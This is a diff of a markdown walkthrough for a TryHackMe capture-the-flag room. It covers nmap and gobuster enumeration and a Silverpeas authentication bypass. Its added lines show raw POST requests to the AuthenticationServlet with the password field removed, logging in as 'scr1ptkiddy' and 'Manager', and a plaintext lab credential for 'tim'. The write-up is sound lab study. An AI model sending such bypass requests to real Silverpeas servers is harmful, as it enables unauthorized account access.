@@ -2,7 +2,7 @@
 
 {% embed url="https://tryhackme.com/r/room/silverplatter" %}
 
-1. Run `nmap` on the target IP address
+1. ### Run `nmap` on the target IP address
 
 ```bash
 $ nmap -sS -n -v -Pn [target_ip]
@@ -13,15 +13,13 @@ $ nmap -sS -n -v -Pn [target_ip]
 
 The results showed that there were 3 open ports: `22`, `80` and `8080`. I tried enumerating SSH at port 80 first, trying to find a CVE for the version.
 
-After realizing that port 22 was least likely to be the vulnerable service (probably a rookie mistake for thinking that it was the vulnerable one in the first place :D), I went on to visit the website at port 80 instead.
-
-2. Gathering information from the website at port `80`, and trying to attack it
+After realizing that port 22 was least likely to be the vulnerable service (probably a rookie mistake for thinking that it was the vulnerable one in the first place :D), I went on to visit the website at port 80 instead
 
 #### Information gathering
 
 After running through the website with interception from Burp suite community, I viewed the sitemap generated (**Target** -> **Site map**), but didn't find any useful information.&#x20;
 
-After reading through the text content present, a particular term: **silverpeas**, caught my eye. I decided to research about it.&#x20;
+After reading through the text content present, a particular term: **silverpeas**, and the username **scr1ptkiddy** caught my eye. I decided to research about it.&#x20;
 
 **Silverpeas** is a ...
 
@@ -31,7 +29,9 @@ From the results obtained in `nmap`above, I tried to lookup for CVEs related to 
 
 ...
 
-3. Enumerating port 80 with common **silverpeas** directories
+
+
+### 3. Enumerating port 80 with common _silverpeas_ directories
 
 From a quick on Google, I gathered various URL paths that are commonly used on a **silverpeas** application. Using the target IP and port 80 as the main host, I tried visiting the brief list of paths listed below:
 
@@ -47,9 +47,9 @@ All the paths returned status code _**404**_ (Not found).
 
 
 
-4. Concentrating my efforts on port 8080 (**silverpeas**)
+### 4. Concentrating my efforts on port 8080 (running Silverpeas)
 
-I decided to start trying to play around with port 8080 instead. After running a quick `nmap` scan, the results shows that it is running a _**http-proxy**_.
+I decided to start trying to play around with port 8080 instead. I visited the website at port 8080 while behind a Burp suite community proxy. After running a quick `nmap` scan, the results shows that it is running a _**http-proxy**_.
 
 ```bash
 $ nmap -sV -n -v -Pn -p8080 [target_ip]
@@ -71,9 +71,7 @@ $ gobuster dir --url http://[target_ip]:8080/silverpeas/ -w [wordlist]
 
 I found a few positive results ...
 
-
-
-5. Continuation on port 8080!
+### 5. Continuing my adventure on port 8080!
 
 **Searching for CVEs and exploits relating to JSP/2.3**
 
@@ -89,6 +87,65 @@ b) `expoit/multi/http/struts2_content_type_ognl`
 
 
 
-6. Further research on **silverpeas**
+### 6. Further research on &#x53;_&#x69;lverpeas_
 
-After much research, I came acrosss a vulnerability listing regarding silverpeas authentication bypass
+After much research, I came across a vulnerability listing regarding **silverpeas** authentication bypass:
+
+{% embed url="https://github.com/advisories/GHSA-4w54-wwc9-x62c" %}
+
+...
+
+...
+
+...
+
+
+
+After playing around with the website at port 8080, I returned to Burp suite and looked through the gathered URLs. I found a `POST` request to a path with the _**AuthenticationServlet**_ word present, this prompted me to test out the vulnerability I have found previously.
+
+I sent the request to the Burp suite _repeater_ and modified the request to remove the `Password` field:
+
+```http
+POST /silverpeas/AuthenticationServlet 
+HTTP/1.1 
+Host: 10.10.14.253:8080 
+
+Login=scr1ptkiddy&DomainId=0
+```
+
+Notice that the `Login` field (presumably the username section) has the value **scr1ptkiddy**, which was found in step 2.
+
+The server returned the following URL value in the `Location` header:
+
+`http://10.10.14.253:8080/silverpeas/look/jsp/MainFrame.jsp`
+
+I visited the URL, and was navigated to a dashboard.
+
+...
+
+
+
+```http
+POST /silverpeas/AuthenticationServlet 
+HTTP/1.1 
+Host: 10.10.14.253:8080 
+
+Login=Manager&DomainId=0
+```
+
+
+
+`http://10.10.14.253:8080/silverpeas/Main//look/jsp/MainFrame.jsp`
+
+\
+After looking around the website, ...
+
+`tim`&#x20;
+
+`cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`
+
+
+
+### 7. Privilege escalation
+
+...
